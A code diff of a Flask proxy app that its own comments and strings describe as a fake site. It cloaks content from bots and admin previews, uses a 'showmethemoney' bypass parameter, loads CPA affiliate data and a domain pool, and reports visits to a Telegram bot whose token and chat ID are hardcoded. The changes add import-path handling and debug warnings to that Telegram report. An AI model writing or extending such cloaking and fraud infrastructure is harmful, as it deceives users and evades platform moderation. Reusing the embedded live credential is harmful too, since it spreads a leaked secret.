@@ -2,14 +2,22 @@ import hashlib, time, random, json, re, os, requests
 from flask import Flask, request, redirect, make_response
 from urllib.parse import urlencode
 
+import sys
+# [V12.5] Force explicit path inclusion for Vercel imports
+current_dir = os.path.dirname(os.path.abspath(__file__))
+if current_dir not in sys.path:
+    sys.path.insert(0, current_dir)
+
 try:
     from cpa_data import CPA_DATA, KEYWORD_MAP, ALL_COMPANIES
     from domain_pool import DOMAIN_POOL
 except ImportError:
+    # Safe fallback with local reference attempt
     try:
         from api.cpa_data import CPA_DATA, KEYWORD_MAP, ALL_COMPANIES
         from api.domain_pool import DOMAIN_POOL
     except ImportError:
+        # Final emergency hardcode only if file is physically missing
         CPA_DATA = {}
         KEYWORD_MAP = {}
         ALL_COMPANIES = {}
@@ -253,9 +261,14 @@ def proxy_master_final(path):
                                   f"👁️ 가짜사이트: {request.base_url}?k={k}&t={t}&bypass=showmethemoney")
             
             if report_msg:
+                # Add Debug Info to Telegram if key is missing
+                if k and k not in CPA_DATA:
+                    report_msg += f"\n⚠️ 경고: [k] 코드를 DB에서 찾을 수 없음 ({len(CPA_DATA)} keys loaded)"
+                
                 requests.get(f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage", 
                              params={"chat_id": "1898653696", "text": report_msg}, timeout=2)
-        except: pass
+        except Exception as telegram_err:
+            print(f"Telegram Error: {str(telegram_err)}")
 
         # [3. CLOAKING MODE (Bots or Admin Preview)]
         if is_bot_user or is_admin_preview:
